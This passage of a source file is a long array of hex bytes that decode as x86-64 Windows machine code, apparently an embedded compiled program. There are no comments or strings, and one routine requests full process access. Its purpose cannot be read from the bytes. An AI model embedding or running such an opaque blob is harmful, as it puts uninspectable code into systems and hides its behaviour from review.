    0x00, 0x00, 0x48, 0x8B, 0x15, 0x9F, 0xBF, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x30, 0x41, 0xB8,
    0x18, 0x03, 0x00, 0x00, 0xE8, 0x47, 0x36, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x4B, 0x48, 0xC7, 0x44,
    0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x84, 0x24, 0x3C, 0x02, 0x00, 0x00, 0x48, 0x8D,
    0x54, 0x24, 0x34, 0x8B, 0x4C, 0x24, 0x30, 0x4C, 0x8D, 0x4C, 0x24, 0x28, 0xE8, 0xAF, 0x0B, 0x00,
    0x00, 0x89, 0xC1, 0x31, 0xC0, 0x85, 0xC9, 0x78, 0x21, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x48, 0x85,
    0xC9, 0x74, 0x17, 0x48, 0x8B, 0x05, 0x4E, 0xBF, 0x00, 0x00, 0x48, 0x89, 0x88, 0x10, 0x03, 0x00,
    0x00, 0xB8, 0x1A, 0x09, 0x00, 0x00, 0xEB, 0x02, 0x31, 0xC0, 0x48, 0x81, 0xC4, 0x48, 0x03, 0x00,
    0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x8D, 0x0D, 0x48, 0xA0, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x32, 0xA9,
    0x00, 0x00, 0x4C, 0x8D, 0x05, 0xAF, 0x89, 0x00, 0x00, 0xFF, 0x15, 0xF9, 0xBD, 0x00, 0x00, 0x48,
    0x8B, 0x15, 0x02, 0xBF, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x41, 0xB8, 0x08, 0x00, 0x00,
    0x00, 0xE8, 0xAA, 0x35, 0x00, 0x00, 0x89, 0xC1, 0x31, 0xC0, 0x84, 0xC9, 0x74, 0x31, 0x80, 0x3D,
    0x7B, 0xBE, 0x00, 0x00, 0x00, 0x74, 0x28, 0x8B, 0x4C, 0x24, 0x20, 0x48, 0x8D, 0x15, 0x3E, 0xBE,
    0x00, 0x00, 0xE8, 0x29, 0x2C, 0x00, 0x00, 0x85, 0xC0, 0x78, 0x12, 0x48, 0x8B, 0x05, 0xC6, 0xBE,
    0x00, 0x00, 0xC6, 0x40, 0x04, 0x01, 0xB8, 0x1A, 0x09, 0x00, 0x00, 0xEB, 0x02, 0x31, 0xC0, 0x48,
    0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x8D, 0x0D, 0xF0, 0x9F, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xB2, 0xA8,
    0x00, 0x00, 0x4C, 0x8D, 0x05, 0x4B, 0x89, 0x00, 0x00, 0xFF, 0x15, 0x79, 0xBD, 0x00, 0x00, 0x48,
    0x8B, 0x15, 0x82, 0xBE, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x41, 0xB8, 0x08, 0x00, 0x00,
    0x00, 0xE8, 0x2A, 0x35, 0x00, 0x00, 0x89, 0xC1, 0x31, 0xC0, 0x84, 0xC9, 0x74, 0x29, 0x80, 0x3D,
    0xFB, 0xBD, 0x00, 0x00, 0x00, 0x74, 0x20, 0x8B, 0x4C, 0x24, 0x20, 0x48, 0x8D, 0x15, 0xBE, 0xBD,
    0x00, 0x00, 0xE8, 0xE9, 0x2C, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x4A, 0xBE, 0x00, 0x00, 0xC6, 0x40,
    0x04, 0x01, 0xB8, 0x1A, 0x09, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x56, 0x48, 0x83, 0xEC, 0x50, 0x48, 0x8D, 0x0D, 0xAA, 0x9F, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x41,
    0xA8, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xF9, 0x88, 0x00, 0x00, 0xFF, 0x15, 0x08, 0xBD, 0x00, 0x00,
    0x48, 0x8B, 0x15, 0x11, 0xBE, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x28, 0x41, 0xB8, 0x28, 0x00,
    0x00, 0x00, 0xE8, 0xB9, 0x34, 0x00, 0x00, 0x84, 0xC0, 0x0F, 0x84, 0x3C, 0x01, 0x00, 0x00, 0x8B,
    0x44, 0x24, 0x4C, 0x83, 0xF8, 0x04, 0x75, 0x3F, 0x80, 0x3D, 0x81, 0xBD, 0x00, 0x00, 0x00, 0x75,
    0x36, 0x8B, 0x4C, 0x24, 0x2C, 0x48, 0x8D, 0x15, 0x44, 0xBD, 0x00, 0x00, 0xE8, 0x4F, 0x26, 0x00,
    0x00, 0x85, 0xC0, 0x0F, 0x88, 0x8F, 0x00, 0x00, 0x00, 0xE8, 0xF2, 0x32, 0x00, 0x00, 0x85, 0xC0,
    0x0F, 0x88, 0x9F, 0x00, 0x00, 0x00, 0xE8, 0xB5, 0x20, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0xA2,
    0x00, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x4C, 0x44, 0x8B, 0x4C, 0x24, 0x48, 0x4C, 0x8B, 0x44, 0x24,
    0x40, 0x8B, 0x4C, 0x24, 0x28, 0x8B, 0x54, 0x24, 0x2C, 0x89, 0x44, 0x24, 0x20, 0xE8, 0xEE, 0x0D,
    0x00, 0x00, 0x48, 0x89, 0xC6, 0x8B, 0x44, 0x24, 0x4C, 0x48, 0x85, 0xF6, 0x74, 0x38, 0x83, 0xF8,
    0x04, 0x75, 0x1E, 0x48, 0x8D, 0x0D, 0x18, 0x92, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x93, 0xA7, 0x00,
    0x00, 0x4C, 0x8D, 0x05, 0x4B, 0x88, 0x00, 0x00, 0x49, 0x89, 0xF1, 0xFF, 0x15, 0x57, 0xBC, 0x00,
    0x00, 0x48, 0x8B, 0x05, 0x60, 0xBD, 0x00, 0x00, 0x48, 0x89, 0x70, 0x10, 0xB8, 0x1A, 0x09, 0x00,
    0x00, 0xE9, 0x97, 0x00, 0x00, 0x00, 0x83, 0xF8, 0x04, 0x0F, 0x85, 0x8C, 0x00, 0x00, 0x00, 0x48,
    0x8D, 0x0D, 0x2A, 0x91, 0x00, 0x00, 0xEB, 0x34, 0x48, 0x8D, 0x0D, 0xE9, 0x86, 0x00, 0x00, 0x48,
    0x8D, 0x15, 0x4E, 0xA7, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x06, 0x88, 0x00, 0x00, 0xFF, 0x15, 0x15,
    0xBC, 0x00, 0x00, 0xEB, 0x66, 0x48, 0x8D, 0x0D, 0x16, 0x96, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x2B,
    0xA7, 0x00, 0x00, 0xEB, 0x0E, 0x48, 0x8D, 0x0D, 0xBE, 0x9F, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x21,
    0xA7, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xD9, 0x87, 0x00, 0x00, 0xFF, 0x15, 0xE8, 0xBB, 0x00, 0x00,
    0x48, 0x8D, 0x0D, 0x59, 0xBC, 0x00, 0x00, 0xE8, 0xE4, 0x2C, 0x00, 0x00, 0x48, 0x83, 0x3D, 0x24,
    0x67, 0x04, 0x00, 0x00, 0x74, 0x25, 0x48, 0x8B, 0x0D, 0x13, 0x67, 0x04, 0x00, 0xB2, 0x01, 0xFF,
    0x15, 0x83, 0xBA, 0x00, 0x00, 0x48, 0xC7, 0x05, 0x08, 0x67, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0xC7, 0x05, 0xF5, 0x66, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0xC0, 0x48, 0x83, 0xC4,
    0x50, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x81, 0xEC, 0x98,
    0x01, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xB0, 0x9E,
    0x00, 0x00, 0x48, 0x8D, 0x15, 0x9B, 0xA6, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xBE, 0x87, 0x00, 0x00,
    0xFF, 0x15, 0x62, 0xBB, 0x00, 0x00, 0x48, 0x8B, 0x15, 0x6B, 0xBC, 0x00, 0x00, 0x48, 0x8D, 0x8C,
    0x24, 0x88, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x28, 0x00, 0x00, 0x00, 0xE8, 0x10, 0x33, 0x00, 0x00,
    0x84, 0xC0, 0x0F, 0x84, 0x64, 0x01, 0x00, 0x00, 0x48, 0x83, 0xBC, 0x24, 0x98, 0x00, 0x00, 0x00,
    0x00, 0x0F, 0x84, 0x5C, 0x01, 0x00, 0x00, 0x83, 0xBC, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x00, 0x0F,
    0x84, 0x4E, 0x01, 0x00, 0x00, 0x83, 0xBC, 0x24, 0x8C, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x40,
    0x01, 0x00, 0x00, 0x0F, 0x28, 0x05, 0x36, 0x74, 0x00, 0x00, 0x0F, 0x29, 0x84, 0x24, 0x60, 0x01,
    0x00, 0x00, 0x0F, 0x28, 0x05, 0x17, 0x74, 0x00, 0x00, 0x0F, 0x29, 0x84, 0x24, 0x50, 0x01, 0x00,
    0x00, 0x0F, 0x28, 0x05, 0xF8, 0x73, 0x00, 0x00, 0x0F, 0x29, 0x84, 0x24, 0x40, 0x01, 0x00, 0x00,
    0x66, 0xC7, 0x84, 0x24, 0x70, 0x01, 0x00, 0x00, 0x00, 0x00, 0xB9, 0x00, 0x10, 0x00, 0x00, 0xE8,
    0xFC, 0x34, 0x00, 0x00, 0x48, 0x89, 0xC6, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x10, 0x00, 0x00,
    0x48, 0x8D, 0x0D, 0x32, 0x7F, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xEB, 0xA5, 0x00, 0x00, 0x4C, 0x8D,
    0x05, 0x7B, 0x76, 0x00, 0x00, 0x49, 0x89, 0xC1, 0xFF, 0x15, 0xAA, 0xBA, 0x00, 0x00, 0x48, 0x85,
    0xF6, 0x0F, 0x84, 0xD5, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x94, 0x24, 0x40, 0x01, 0x00, 0x00, 0x41,
    0xB8, 0x32, 0x00, 0x00, 0x00, 0x48, 0x89, 0xF1, 0xFF, 0x15, 0x92, 0xBA, 0x00, 0x00, 0x48, 0x8B,
    0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x89, 0x46, 0x06, 0x8B, 0x84, 0x24, 0xA0, 0x00, 0x00,
    0x00, 0x48, 0x03, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x89, 0x46, 0x10, 0x8B, 0x84, 0x24,
    0xA4, 0x00, 0x00, 0x00, 0x8B, 0x8C, 0x24, 0x88, 0x00, 0x00, 0x00, 0x8B, 0x94, 0x24, 0x8C, 0x00,
    0x00, 0x00, 0x89, 0x44, 0x24, 0x20, 0x41, 0xB8, 0x00, 0x10, 0x00, 0x00, 0x45, 0x31, 0xC9, 0xE8,
    0xAC, 0x0B, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x91, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC3,
    0x48, 0xC7, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x8C, 0x24, 0x8C,
    0x00, 0x00, 0x00, 0x4C, 0x8D, 0xB4, 0x24, 0x80, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xF2, 0xFF, 0x15,
    0xDC, 0xB8, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x84, 0x84, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x71,
    0x88, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x24, 0xA5, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x4D, 0x86, 0x00,
    0x00, 0xFF, 0x15, 0xF1, 0xB9, 0x00, 0x00, 0xBA, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89, 0xD9, 0xFF,
    0x15, 0xA3, 0xB7, 0x00, 0x00, 0x31, 0xDB, 0xE9, 0xEE, 0x05, 0x00, 0x00, 0x31, 0xDB, 0xE9, 0x1C,
    0x06, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x36, 0x91, 0x00, 0x00, 0xEB, 0x07, 0x48, 0x8D, 0x0D, 0xCE,
    0x98, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xE4, 0xA4, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x0D, 0x86, 0x00,
    0x00, 0xFF, 0x15, 0xB1, 0xB9, 0x00, 0x00, 0x31, 0xDB, 0xE9, 0xF1, 0x05, 0x00, 0x00, 0x48, 0x8D,
    0x0D, 0xE7, 0x98, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xC2, 0xA4, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xEB,
    0x85, 0x00, 0x00, 0xFF, 0x15, 0x8F, 0xB9, 0x00, 0x00, 0x31, 0xDB, 0xE9, 0x9A, 0x05, 0x00, 0x00,
    0x48, 0x8B, 0xBC, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x85, 0xFF, 0x74, 0x27, 0x48, 0x89, 0x7C,
    0x24, 0x20, 0x48, 0x8D, 0x0D, 0x90, 0x90, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x99, 0xA4, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0x45, 0x95, 0x00, 0x00, 0x4C, 0x8D, 0x0D, 0x41, 0x86, 0x00, 0x00, 0xFF, 0x15,
    0x54, 0xB9, 0x00, 0x00, 0x80, 0x3D, 0xF5, 0xB9, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xCE, 0xB9,
    0x00, 0x00, 0x49, 0x0F, 0x44, 0xC6, 0x4C, 0x8B, 0x30, 0xFF, 0x15, 0x49, 0xB8, 0x00, 0x00, 0x48,
    0xC7, 0x44, 0x24, 0x20, 0x32, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC1, 0x48, 0x89, 0xF2, 0x4D, 0x89,
    0xF0, 0x49, 0x89, 0xD9, 0xE8, 0xF7, 0x5A, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0xD9, 0x01, 0x00,
    0x00, 0x48, 0xC7, 0x44, 0x24, 0x60, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x57, 0xF6, 0x0F, 0x29, 0xB4,
    0x24, 0x20, 0x01, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24, 0x10, 0x01, 0x00, 0x00, 0x48, 0xC7, 0x84,
    0x24, 0xC8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x84, 0x24, 0x8C, 0x00, 0x00, 0x00,
    0x48, 0x89, 0x84, 0x24, 0xC0, 0x00, 0x00, 0x00, 0xC7, 0x84, 0x24, 0x10, 0x01, 0x00, 0x00, 0x30,
    0x00, 0x00, 0x00, 0x48, 0xC7, 0x84, 0x24, 0x18, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC7,
    0x84, 0x24, 0x28, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x48, 0xC7, 0x84, 0x24, 0x20, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x29, 0xB4, 0x24, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8D,
    0x4C, 0x24, 0x60, 0x4C, 0x8D, 0x84, 0x24, 0x10, 0x01, 0x00, 0x00, 0x4C, 0x8D, 0x8C, 0x24, 0xC0,
    0x00, 0x00, 0x00, 0xBA, 0xFF, 0xFF, 0x1F, 0x00, 0xFF, 0x15, 0x62, 0xB8, 0x00, 0x00, 0x85, 0xC0,
    0x0F, 0x88, 0x74, 0x01, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x58, 0x00, 0x00, 0x00, 0x00, 0x0F,
    0x29, 0xB4, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x48, 0x8D, 0x84, 0x24,
    0xB0, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8D, 0x44, 0x24, 0x58, 0x48, 0x89,
    0x44, 0x24, 0x40, 0x48, 0x89, 0x5C, 0x24, 0x30, 0x0F, 0x11, 0x74, 0x24, 0x20, 0x48, 0xC7, 0x44,
    0x24, 0x38, 0x00, 0x00, 0x00, 0x00, 0x31, 0xD2, 0x41, 0xB0, 0x01, 0x45, 0x31, 0xC9, 0xFF, 0x15,
    0x04, 0xB8, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0x51, 0x01, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24,
    0x70, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54,
    0x24, 0x70, 0xFF, 0x15, 0xE0, 0xB6, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0x36, 0x01, 0x00, 0x00,
    0x4C, 0x8B, 0x74, 0x24, 0x70, 0x4D, 0x85, 0xF6, 0x74, 0x27, 0x4C, 0x89, 0x74, 0x24, 0x20, 0x48,
    0x8D, 0x0D, 0x13, 0x8F, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x1C, 0xA3, 0x00, 0x00, 0x4C, 0x8D, 0x05,
    0xC8, 0x93, 0x00, 0x00, 0x4C, 0x8D, 0x0D, 0xC4, 0x84, 0x00, 0x00, 0xFF, 0x15, 0xD7, 0xB7, 0x00,
    0x00, 0x80, 0x3D, 0x78, 0xB8, 0x00, 0x00, 0x00, 0x74, 0x1B, 0x8B, 0x8C, 0x24, 0xB8, 0x00, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0x38, 0xB8, 0x00, 0x00, 0xE8, 0x23, 0x26, 0x00, 0x00, 0x85, 0xC0, 0x0F,
    0x88, 0x47, 0x01, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x7C, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C,
    0x24, 0x70, 0x48, 0x8D, 0x54, 0x24, 0x7C, 0xFF, 0x15, 0x83, 0xB6, 0x00, 0x00, 0x85, 0xC0, 0x0F,
    0x88, 0xF4, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x48, 0x85, 0xC9, 0x0F, 0x84, 0x7E,
    0x01, 0x00, 0x00, 0x48, 0xC7, 0x84, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x80, 0x2E, 0x0F, 0xF7, 0x4C,
    0x8D, 0x84, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x31, 0xD2, 0xFF, 0x15, 0x51, 0xB7, 0x00, 0x00, 0x3D,
    0x02, 0x01, 0x00, 0x00, 0x0F, 0x85, 0x17, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xD9, 0x8A, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0x8C, 0xA2, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x9F, 0x83, 0x00, 0x00, 0xFF,
    0x15, 0x43, 0xB7, 0x00, 0x00, 0xE9, 0x37, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xF8, 0x85, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0x56, 0xA2, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x7F, 0x83, 0x00, 0x00, 0xFF,
    0x15, 0x23, 0xB7, 0x00, 0x00, 0xBA, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89, 0xD9, 0xFF, 0x15, 0xD5,
    0xB4, 0x00, 0x00, 0x31, 0xDB, 0xE9, 0xEB, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x34, 0xA0, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0x26, 0xA2, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x4F, 0x83, 0x00, 0x00, 0x41,
    0x89, 0xC1, 0xFF, 0x15, 0xF0, 0xB6, 0x00, 0x00, 0xBA, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89, 0xD9,
    0xFF, 0x15, 0xA2, 0xB4, 0x00, 0x00, 0x31, 0xDB, 0xE9, 0x88, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x0D,
    0x56, 0x9F, 0x00, 0x00, 0xEB, 0x07, 0x48, 0x8D, 0x0D, 0xBA, 0x9F, 0x00, 0x00, 0x48, 0x8D, 0x15,
    0xEA, 0xA1, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x13, 0x83, 0x00, 0x00, 0x41, 0x89, 0xC1, 0xFF, 0x15,
    0xB4, 0xB6, 0x00, 0x00, 0xBA, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89, 0xD9, 0xFF, 0x15, 0x66, 0xB4,
    0x00, 0x00, 0x31, 0xDB, 0xE9, 0x1C, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x53, 0x9F, 0x00, 0x00,
    0x48, 0x8D, 0x15, 0xB7, 0xA1, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xE0, 0x82, 0x00, 0x00, 0x41, 0x89,
    0xC1, 0xFF, 0x15, 0x81, 0xB6, 0x00, 0x00, 0xBA, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89, 0xD9, 0xFF,
    0x15, 0x33, 0xB4, 0x00, 0x00, 0x31, 0xDB, 0xE9, 0xB4, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x84,
    0xA0, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x84, 0xA1, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xAD, 0x82, 0x00,
    0x00, 0x41, 0x89, 0xC1, 0xFF, 0x15, 0x4E, 0xB6, 0x00, 0x00, 0x31, 0xDB, 0xE9, 0x8F, 0x01, 0x00,
    0x00, 0x4C, 0x8B, 0x15, 0x40, 0xB6, 0x00, 0x00, 0x85, 0xC0, 0x78, 0x1A, 0x48, 0x8D, 0x0D, 0xAF,
    0x72, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x5A, 0xA1, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x7D, 0x82, 0x00,
    0x00, 0x41, 0xFF, 0xD2, 0xEB, 0x1B, 0x48, 0x8D, 0x0D, 0x73, 0x9E, 0x00, 0x00, 0x48, 0x8D, 0x15,
    0x3A, 0xA1, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x63, 0x82, 0x00, 0x00, 0x41, 0x89, 0xC1, 0x41, 0xFF,
    0xD2, 0x0F, 0x57, 0xC0, 0x0F, 0x29, 0x84, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x0F, 0x29, 0x84, 0x24,
    0xE0, 0x00, 0x00, 0x00, 0x0F, 0x29, 0x84, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x66, 0xC7, 0x84, 0x24,
    0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x80, 0x3D, 0x83, 0xB6, 0x00, 0x00, 0x00, 0x74, 0x31, 0x4C,
    0x8B, 0x3D, 0x5A, 0xB6, 0x00, 0x00, 0xFF, 0x15, 0xDC, 0xB4, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24,
    0x20, 0x32, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x94, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC1,
    0x4D, 0x89, 0xF8, 0x49, 0x89, 0xD9, 0xE8, 0x85, 0x57, 0x00, 0x00, 0xE9, 0xB0, 0x00, 0x00, 0x00,
    0x48, 0xC7, 0x44, 0x24, 0x68, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x8C, 0x24, 0x8C, 0x00, 0x00, 0x00,
    0x48, 0x8D, 0x54, 0x24, 0x68, 0xFF, 0x15, 0x55, 0xB4, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x85, 0x8D,
    0x00, 0x00, 0x00, 0x4C, 0x8B, 0x7C, 0x24, 0x68, 0x4D, 0x85, 0xFF, 0x0F, 0x84, 0xDD, 0x01, 0x00,
    0x00, 0x4C, 0x89, 0x7C, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x8C, 0x8C, 0x00, 0x00, 0x4C, 0x8D, 0x25,
    0x95, 0xA0, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x41, 0x91, 0x00, 0x00, 0x4C, 0x8D, 0x2D, 0x3D, 0x82,
    0x00, 0x00, 0x4C, 0x89, 0xE2, 0x4D, 0x89, 0xE9, 0xFF, 0x15, 0x4A, 0xB5, 0x00, 0x00, 0x48, 0x8B,
    0x6C, 0x24, 0x68, 0xFF, 0x15, 0x4F, 0xB4, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x32, 0x00,
    0x00, 0x00, 0x48, 0x8D, 0x94, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC1, 0x49, 0x89, 0xE8,
    0x49, 0x89, 0xD9, 0xE8, 0xF8, 0x56, 0x00, 0x00, 0x4C, 0x89, 0x7C, 0x24, 0x20, 0x48, 0x8D, 0x0D,
    0xFF, 0x8B, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xF0, 0x90, 0x00, 0x00, 0x4C, 0x89, 0xE2, 0x4D, 0x89,
    0xE9, 0xFF, 0x15, 0x01, 0xB5, 0x00, 0x00, 0x4C, 0x89, 0xF9, 0xFF, 0x15, 0x10, 0xB4, 0x00, 0x00,
    0x48, 0x8B, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x44, 0x8B, 0x8C, 0x24, 0x8C, 0x00, 0x00, 0x00,
    0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0xC3, 0x8A, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x01,
    0xA0, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x24, 0x81, 0x00, 0x00, 0xFF, 0x15, 0xC8, 0xB4, 0x00, 0x00,
    0x48, 0x8B, 0x05, 0xD1, 0xB5, 0x00, 0x00, 0xC6, 0x40, 0x20, 0x01, 0xBB, 0x1A, 0x09, 0x00, 0x00,
    0x4D, 0x85, 0xF6, 0x74, 0x30, 0x4C, 0x89, 0x74, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x92, 0x8B, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0xD1, 0x9F, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x7C, 0x90, 0x00, 0x00, 0x4C,
    0x8D, 0x0D, 0x79, 0x81, 0x00, 0x00, 0xFF, 0x15, 0x8C, 0xB4, 0x00, 0x00, 0x4C, 0x89, 0xF1, 0xFF,
    0x15, 0x9B, 0xB3, 0x00, 0x00, 0x4C, 0x8B, 0x4C, 0x24, 0x58, 0x4D, 0x85, 0xC9, 0x74, 0x26, 0x48,
    0x8D, 0x0D, 0x35, 0x8B, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x9C, 0x9F, 0x00, 0x00, 0x4C, 0x8D, 0x05,
    0xD7, 0x91, 0x00, 0x00, 0xFF, 0x15, 0x5E, 0xB4, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0xFF,
    0x15, 0x33, 0xB4, 0x00, 0x00, 0x4C, 0x8B, 0x4C, 0x24, 0x60, 0x4D, 0x85, 0xC9, 0x74, 0x26, 0x48,
    0x8D, 0x0D, 0x05, 0x8B, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x6C, 0x9F, 0x00, 0x00, 0x4C, 0x8D, 0x05,
    0xA7, 0x91, 0x00, 0x00, 0xFF, 0x15, 0x2E, 0xB4, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0xFF,
    0x15, 0x03, 0xB4, 0x00, 0x00, 0x48, 0x85, 0xFF, 0x74, 0x30, 0x48, 0x89, 0x7C, 0x24, 0x20, 0x48,
    0x8D, 0x0D, 0xFD, 0x8A, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x3C, 0x9F, 0x00, 0x00, 0x4C, 0x8D, 0x05,
    0xE7, 0x8F, 0x00, 0x00, 0x4C, 0x8D, 0x0D, 0xE4, 0x80, 0x00, 0x00, 0xFF, 0x15, 0xF7, 0xB3, 0x00,
    0x00, 0x48, 0x89, 0xF9, 0xFF, 0x15, 0x06, 0xB3, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00,
    0x10, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x19, 0x78, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x08, 0x9F, 0x00,
    0x00, 0x4C, 0x8D, 0x05, 0x97, 0x6F, 0x00, 0x00, 0x49, 0x89, 0xF1, 0xFF, 0x15, 0xC7, 0xB3, 0x00,
